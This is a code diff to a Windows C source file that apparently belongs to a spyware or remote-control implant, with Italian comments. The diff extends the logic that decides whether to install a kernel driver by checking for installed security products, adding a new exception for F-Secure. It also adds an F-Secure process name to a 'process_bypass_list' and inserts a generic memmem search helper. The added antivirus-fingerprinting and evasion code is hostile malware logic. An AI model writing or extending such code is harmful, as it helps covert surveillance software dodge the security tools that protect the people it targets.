@@ -1496,7 +1496,7 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 	// Decide se e dove copiare il driver 
 	// (Se c'e' ZoneAlarm E ctfmon NON mette il driver)
 	if ( (IsVista(&dummy) || IsAvira() || IsDeepFreeze() || IsBlink() || IsPGuard() || /*IsKaspersky() ||*/ IsMcAfee() || IsKerio() || IsComodo2() || IsComodo3() || IsPanda() || IsTrend() || IsZoneAlarm() || IsAshampoo() || IsEndPoint())
-		 && !(IsZoneAlarm() && HM_FindPid("ctfmon.exe", TRUE)) && !IsRising() && !IsADAware() && !IsSunBeltPF() && !IsSophos32() && (!IsPCTools() || IsDeepFreeze()) && (!IsKaspersky() || IsDeepFreeze())) {
+		 && !(IsZoneAlarm() && HM_FindPid("ctfmon.exe", TRUE)) && !IsRising() && !IsADAware() && !IsSunBeltPF() && !IsSophos32() && (!IsPCTools() || IsDeepFreeze()) && (!IsKaspersky() || IsDeepFreeze())  && (!IsFSecure() || IsDeepFreeze())) {
 		WCHAR drv_path[DLLNAMELEN*2];
 
 		if (!HM_GuessNames()) {
@@ -2070,6 +2070,7 @@ void HM_UpdateGlobalConf()
 	strcpy(process_bypass_list[25],"pcts*.exe");
 	strcpy(process_bypass_list[26],"iexplore.exe");
 	strcpy(process_bypass_list[27],"chrome.exe");
+	strcpy(process_bypass_list[28],"fsm32.exe");
 	// XXX Se ne aggiungo, ricordarsi di modificare EMBEDDED_BYPASS
 
 	// Legge il delta date dal file di stato...
@@ -2383,6 +2384,50 @@ void UnlockConfFile()
 			break;
 		Sleep(DELETE_SLEEP_TIME);
 	}
+}
+
+/* Return the first occurrence of NEEDLE in HAYSTACK. */
+#define __builtin_expect(expr, val)   (expr)
+void *memmem (const void *haystack, size_t haystack_len, const void *needle, size_t needle_len)
+{
+  /* not really Rabin-Karp, just using additive hashing */
+  char* haystack_ = (char*)haystack;
+  char* needle_ = (char*)needle;
+  int hash = 0;		/* this is the static hash value of the needle */
+  int hay_hash = 0;	/* rolling hash over the haystack */
+  char* last;
+  size_t i;
+
+  if (haystack_len < needle_len)
+    return NULL;
+
+  if (!needle_len)
+    return haystack_;
+
+  /* initialize hashes */
+  for (i = needle_len; i; --i)
+    {
+      hash += *needle_++;
+      hay_hash += *haystack_++;
+    }
+
+  /* iterate over the haystack */
+  haystack_ = (char*)haystack;
+  needle_ = (char*)needle;
+  last = haystack_+(haystack_len - needle_len + 1);
+  for (; haystack_ < last; ++haystack_)
+    {
+      if (__builtin_expect(hash == hay_hash, 0) &&
+	  *haystack_ == *needle_ &&	/* prevent calling memcmp, was a optimization from existing glibc */
+	  !memcmp (haystack_, needle_, needle_len))
+	return haystack_;
+
+      /* roll the hash */
+      hay_hash -= *haystack_;
+      hay_hash += *(haystack_+needle_len);
+    }
+
+  return NULL;
 }
 
 void HM_CalcDateDelta(long long server_time, nanosec_time *delta)
